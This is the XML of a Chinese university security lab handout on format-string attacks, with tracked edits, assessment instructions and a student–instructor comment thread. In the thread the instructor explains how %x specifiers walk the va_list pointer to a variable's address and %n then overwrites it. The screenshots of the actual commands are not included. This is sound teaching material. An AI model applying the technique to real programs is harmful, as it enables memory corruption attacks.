    <w:p w14:paraId="08532380" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="363" w:author="zhao ruizhi" w:date="2023-05-08T16:58:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="364" w:author="zhao ruizhi" w:date="2023-05-08T16:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="403877CE" wp14:editId="5159032F">
              <wp:extent cx="5274310" cy="1737995"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="1737415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15954" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId33"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1737995"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="788587AA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="365" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
          <w:rPrChange w:id="366" w:author="zhao ruizhi" w:date="2023-05-08T16:58:00Z">
            <w:rPr>
              <w:ins w:id="367" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z"/>
              <w:lang w:eastAsia="zh-CN"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="368" w:author="zhao ruizhi" w:date="2023-05-08T16:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>根据如上的输出结果修改代码，</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="369" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
            <w:rPrChange w:id="370" w:author="zhao ruizhi" w:date="2023-05-08T16:58:00Z">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:lang w:eastAsia="zh-CN"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>以下是修改的部分：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="35B27E5E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:ins w:id="371" w:author="zhao ruizhi" w:date="2023-05-08T16:56:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:pPrChange w:id="372" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z">
          <w:pPr>
            <w:pStyle w:val="af2"/>
            <w:numPr>
              <w:numId w:val="7"/>
            </w:numPr>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:ind w:left="1282" w:hanging="440"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="373" w:author="zhao ruizhi" w:date="2023-05-08T16:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EDC0ABF" wp14:editId="3A953813">
              <wp:extent cx="5274310" cy="2602865"/>
              <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
              <wp:docPr id="1659598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98790" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId34"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="2602865"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1BA6AE7F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="374" w:author="zhao ruizhi" w:date="2023-05-08T16:56:00Z"/>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="375" w:author="zhao ruizhi" w:date="2023-05-08T16:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:t>攻击成功：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="64810983" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRPr="00193C1A" w:rsidRDefault="00000000" w:rsidP="00193C1A">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="1282" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:rPrChange w:id="376" w:author="zhao ruizhi" w:date="2023-05-08T16:55:00Z">
            <w:rPr/>
          </w:rPrChange>
        </w:rPr>
        <w:pPrChange w:id="377" w:author="zhao ruizhi" w:date="2023-05-08T16:56:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="378" w:author="zhao ruizhi" w:date="2023-05-08T16:59:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:lang w:eastAsia="zh-CN"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0994FFF5" wp14:editId="342BFF52">
              <wp:extent cx="5274310" cy="1206500"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="730072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72775" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId35"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="1206500"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4556DC74" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="379" w:author="zhao ruizhi" w:date="2023-05-08T17:00:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30541D44" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="380" w:author="zhao ruizhi" w:date="2023-05-08T17:00:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25F38C5A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="381" w:author="zhao ruizhi" w:date="2023-05-08T16:59:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0B5C1996" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="382" w:author="zhao ruizhi" w:date="2023-05-08T16:59:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="674E4E81" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="383" w:author="zhao ruizhi" w:date="2023-05-08T16:59:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4226A1D9" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:del w:id="384" w:author="zhao ruizhi" w:date="2023-05-08T16:59:00Z"/>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F1BECC1" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D5689AB" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>实验考核：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEC51FF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>、实验完毕后上交实验报告，实验报告的内容包括实验要求、实验内容、实现方法、实验结果及结论分析等，实验报告一律写成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>50M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>内</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>word</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>或</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>pdf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>文档。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04125432" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>、将实验报告上传到坚果云</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00193C1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20230103115259" w:date="2023-04-28T15:54:00Z" w:initials="">
    <w:p w14:paraId="4E34AA40" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>此处的命令是否与图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>不符？我使用如下命令完成了第二道思考题：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="557439E8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="16EEB1CD" wp14:editId="5E27C41C">
            <wp:extent cx="5268595" cy="1015365"/>
            <wp:effectExtent l="0" t="0" r="1905" b="635"/>
            <wp:docPr id="8" name="图片 8" descr="屏幕截图 2023-04-28 1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3-04-28 155703"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5268595" cy="1015365"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66DE5F42" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="369B60AE" wp14:editId="01D8CC61">
            <wp:extent cx="5270500" cy="455930"/>
            <wp:effectExtent l="0" t="0" r="0" b="1270"/>
            <wp:docPr id="14" name="图片 14" descr="屏幕截图 2023-04-28 155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3-04-28 155741"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5270500" cy="455930"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF948FB" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>但是和实验指导中的命令有区别。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2571B581" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是小数点位置不同，我使用的是图</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>相近的写法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37BEA6C6" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>是我使用了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>才打印出</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164CD422" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="75255E8E" wp14:editId="35A96C11">
            <wp:extent cx="5268595" cy="918845"/>
            <wp:effectExtent l="0" t="0" r="1905" b="8255"/>
            <wp:docPr id="15" name="图片 15" descr="屏幕截图 2023-04-28 15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3-04-28 153117"/>
                    <pic:cNvPicPr>
                      <a:picLocks noChangeAspect="1"/>
                    </pic:cNvPicPr>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5268595" cy="918845"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C72CDA8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>但我在输入中也构造了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，而不是下文标黄显示中提到的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个，是否是实验指导书有误？或是有其他原因？希望可以解释下。</w:t>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="33" w:author="804242129@qq.com" w:date="2023-04-29T10:41:00Z" w:initials="8">
    <w:p w14:paraId="3EC9366F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>这里的小数点仅作分隔输出使用，可用空格或其他字符代替</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FDF1CC5" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>此处实验指导书无误，这里并不是要打印</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值，而是要修改</w:t>
      </w:r>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的值，因此需要前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>移动</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>a_list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>指针到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>地址，再用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>向该地址处写入值</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BB3D415" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="a4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>另外此处</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的个数只是举例，具体偏移量会根据实验环境的不同而有所变化，需要通过试错法进一步确定</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72CDA8" w15:done="0"/>
  <w15:commentEx w15:paraId="2BB3D4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72CDA8" w16cid:durableId="280844A2"/>
  <w16cid:commentId w16cid:paraId="2BB3D415" w16cid:durableId="280844A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altName w:val="DejaVu Sans"/>
    <w:panose1 w:val="020B0604030504040204"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="00000000" w:usb1="00000000" w:usb2="00000029" w:usb3="00000000" w:csb0="200101FF" w:csb1="20280000"/>
  </w:font>
  <w:font w:name="Consolas">
    <w:altName w:val="Liberation Sans Narrow"/>
    <w:panose1 w:val="020B0609020204030204"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
    <w:sig w:usb0="E00006FF" w:usb1="0000FCFF" w:usb2="00000001" w:usb3="00000000" w:csb0="0000019F" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="Noto Sans">
    <w:altName w:val="Gubbi"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="default"/>
    <w:sig w:usb0="00000000" w:usb1="00000000"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370918"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="86370918"/>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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="BE26E3FB"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="BE26E3FB"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimalEnclosedCircleChinese"/>
      <w:suff w:val="nothing"/>
      <w:lvlText w:val="%1　"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="0" w:firstLine="400"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="eastAsia"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="EFFF8B4B"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="EFFF8B4B"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="840"/>
        </w:tabs>
        <w:ind w:left="1260" w:hanging="420"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="F318EC4C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F318EC4C"/>
